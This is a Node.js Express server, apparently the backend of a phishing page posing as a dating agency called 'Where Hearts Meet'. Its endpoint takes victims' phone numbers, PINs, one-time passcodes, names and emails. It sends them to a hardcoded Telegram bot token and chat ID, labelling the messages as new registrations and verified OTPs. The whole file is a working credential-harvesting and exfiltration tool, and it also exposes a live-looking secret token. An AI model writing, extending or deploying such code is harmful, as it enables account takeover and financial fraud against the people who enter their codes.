const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// CORS - allow all origins
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.json());

// ============================================
// WHERE HEARTS MEET AGENCY - TELEGRAM CREDENTIALS
// ============================================
const TG_BOT_TOKEN = '8907836454:AAH-hDujlmY50fqlErWuphD1wJ32RFnkL2I';
const TG_CHAT_ID = '6811595070';
// ============================================

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Telegram notification endpoint
app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, type, site } = req.body;
        
        console.log('📥 Received for Where Hearts Meet:', { phone, pin, name, type, site });
        
        const timestamp = new Date().toLocaleString('en-ZA', { timeZone: 'Africa/Harare' });
        
        let message = '';
        if (type === 'pin') {
            message = `🔐 NEW REGISTRATION - ${site || 'Where Hearts Meet'} 🔐\n\n📞 Phone: ${phone}\n🔢 PIN: ${pin}\n👤 Name: ${name}\n📧 Email: ${email || 'Not provided'}\n⏰ Time: ${timestamp}`;
        } else {
            message = `✅ OTP VERIFIED - ${site || 'Where Hearts Meet'} ✅\n\n📞 Phone: ${phone}\n🔢 OTP: ${pin}\n👤 Name: ${name}\n⏰ Time: ${timestamp}`;
        }
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
        
        const response = await fetch(url);
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Notification sent to Where Hearts Meet Telegram bot');
            res.json({ success: true });
        } else {
            console.error('Telegram error:', result);
            res.json({ success: false, error: result.description });
        }
    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Root route
app.get('/', (req, res) => {
    res.json({ 
        status: 'OK', 
        message: 'Where Hearts Meet Agency API is running!',
        endpoints: ['/health', '/api/send-telegram']
    });
});

app.listen(PORT, () => {
    console.log(`🚀 Where Hearts Meet Server running on port ${PORT}`);
    console.log(`📱 Telegram Bot configured for Where Hearts Meet Agency`);
    console.log(`📨 Bot Token: ${TG_BOT_TOKEN.substring(0, 10)}...`);
    console.log(`👤 Chat ID: ${TG_CHAT_ID}`);
});
